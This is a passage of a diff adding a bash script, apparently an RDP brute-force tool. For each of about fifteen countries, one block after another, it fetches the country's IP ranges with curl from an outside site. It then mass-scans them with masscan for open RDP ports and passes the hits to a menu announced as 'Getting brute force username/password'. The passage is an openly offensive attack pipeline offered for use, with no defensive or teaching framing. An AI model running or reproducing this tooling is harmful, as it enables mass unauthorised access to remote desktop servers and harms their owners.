+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "190" ]; then
+curl http://ipdiapazon.16mb.com/Uganda.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "191" ]; then
+curl http://ipdiapazon.16mb.com/Ukraine.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "192" ]; then
+curl http://ipdiapazon.16mb.com/United.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "193" ]; then
+curl http://ipdiapazon.16mb.com/United_kingdom.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "194" ]; then
+curl http://ipdiapazon.16mb.com/United_states.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "195" ]; then
+curl http://ipdiapazon.16mb.com/Uruguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "196" ]; then
+curl http://ipdiapazon.16mb.com/Uzbekistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "197" ]; then
+curl http://ipdiapazon.16mb.com/Vanuatu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "198" ]; then
+curl http://ipdiapazon.16mb.com/Venezuela.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "199" ]; then
+curl http://ipdiapazon.16mb.com/Viet_nam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "200" ]; then
+curl http://ipdiapazon.16mb.com/Virgin_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "201" ]; then
+curl http://ipdiapazon.16mb.com/Virgin_islands_u.s.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "202" ]; then
+curl http://ipdiapazon.16mb.com/Yemen.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+
+
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "203" ]; then
+curl http://ipdiapazon.16mb.com/Zambia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+
+
+echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"
+
+
+echo ""
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+
+echo ""
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+MAINBRUTEMENUEN
+else
+clear
+
+echo -e "$aquamarine                                             Get a list of IP"
+echo ""
+
+
+if [ "$country"  = "204" ]; then
+curl http://ipdiapazon.16mb.com/Zimbabwe.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
+echo -e "$red---------------------------------------------------------------------------------------------------------$green"
+cat list
+echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
+echo ""
+echo -e "$green*The IP range is saved in the file $red $PWD/list. $colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
+echo -e "$aquamarine                                              Search open RDP.$colorbase"
+echo -e "$red--------------------------------------------------------------------------------------------------------$green"
+echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
+trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
+echo ""
+rate_f () {
+read -p "Maximum number of requests per second {120-30000} : " raten
+echo ""
+rate=$(echo $raten | sed -e 's/[^0-9]//g')
+}
+while rate_f
+do
+	if [[ $rate -gt 119 && $rate -lt 30001 ]];
+		then
+echo -e "The rate is set to $rate$green"
+echo ""
+
+break
+		
+		else		
+echo -e "$red                                 The value must be between 120 and 30000$colorbase"
+echo ""
+sleep 1.7
+clear
+fi
+done
+masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILEEN
+
+
+
+echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
+
+
+echo ""
+
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
+echo -e "$aquamarine                                 Getting brute force username/password... "
+echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"
+
+
+
+
+echo ""
+
+MAINBRUTEMENUEN
+
+if [ "$menuoption" = "5" ]; then
+
+CLEARALL
+exit;
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+fi
+}
+
+########################################################################################
+
+
